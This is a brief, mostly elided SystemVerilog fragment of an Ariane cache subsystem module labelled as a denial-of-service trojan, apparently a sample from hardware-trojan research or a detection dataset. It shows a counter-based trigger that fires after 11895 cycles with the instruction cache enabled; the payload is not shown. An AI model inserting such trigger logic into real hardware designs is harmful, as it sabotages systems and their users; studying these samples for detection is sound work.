...
module std_cache_subsystem_trojan_DoS
  import ariane_pkg::*;
...
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=11895)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 11895;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (icache_en_i) trojan_counter <= trojan_counter + 1;
